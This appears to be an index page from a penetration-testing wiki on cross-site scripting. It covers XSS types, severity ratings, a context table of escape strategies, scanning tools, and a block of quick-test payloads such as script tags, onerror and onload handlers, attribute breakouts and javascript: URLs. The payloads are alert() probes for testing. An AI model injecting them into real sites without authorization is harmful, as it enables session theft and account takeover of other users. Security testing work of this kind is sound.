---
tags:
  - high
  - client-side
---

# XSS - Cross-Site Scripting

## TL;DR

Inject malicious scripts into web pages viewed by other users. Steal sessions, phish credentials, or take over accounts.

```html
<script>alert(document.cookie)</script>
```

**Types:**

| Type | Storage | Trigger | Example |
|------|---------|---------|---------|
| **Reflected** | URL/Request | Victim clicks link | Search results page |
| **Stored** | Database | Any visitor | Comments, profiles |
| **DOM-based** | Client-side | JS manipulation | Fragment identifiers |

## Quick Links

- [Finding XSS](find.md) — Where to look, how to test
- [Exploitation](exploit.md) — From alert() to impact
- [Bypasses](bypasses.md) — Filter and WAF evasion
- [Escalation](escalate.md) — Maximize impact
- [Payloads](../../quick/xss.md) — Copy-paste ready

## Impact

| Scenario | Severity |
|----------|----------|
| Self-XSS only | Informational |
| Reflected, requires interaction | Low-Medium |
| Reflected in sensitive context | Medium-High |
| Stored, affects other users | High |
| Stored + admin/privileged users | Critical |
| Account takeover chain | Critical |

## Quick Test

```html
<!-- HTML context -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Attribute context -->
" onmouseover="alert(1)
" autofocus onfocus="alert(1)

<!-- JavaScript context -->
';alert(1)//
</script><script>alert(1)</script>

<!-- Template literals -->
${alert(1)}

<!-- href/src -->
javascript:alert(1)
```

## Context Detection

Where does your input land?

| Context | Example | Escape Strategy |
|---------|---------|-----------------|
| HTML body | `<p>USER_INPUT</p>` | `<script>` or event handler |
| Attribute (quoted) | `<input value="USER_INPUT">` | `"onmouseover=` |
| Attribute (unquoted) | `<input value=USER_INPUT>` | ` onmouseover=` |
| JavaScript string | `var x = "USER_INPUT"` | `";alert(1)//` |
| JavaScript template | `` `${USER_INPUT}` `` | `${alert(1)}` |
| URL/href | `<a href="USER_INPUT">` | `javascript:` |
| CSS | `style="color:USER_INPUT"` | `red;}</style><script>` |

## Tools

| Tool | Purpose |
|------|---------|
| **XSStrike** | Fuzzer and payload generator |
| **dalfox** | Parameter analysis and XSS scanner |
| **XSSer** | Automatic XSS detection |
| **DOM Invader** | Burp extension for DOM XSS |
| **Caido** | Automate with XSS wordlists |

If basic payloads fail, check [Bypasses](bypasses.md).
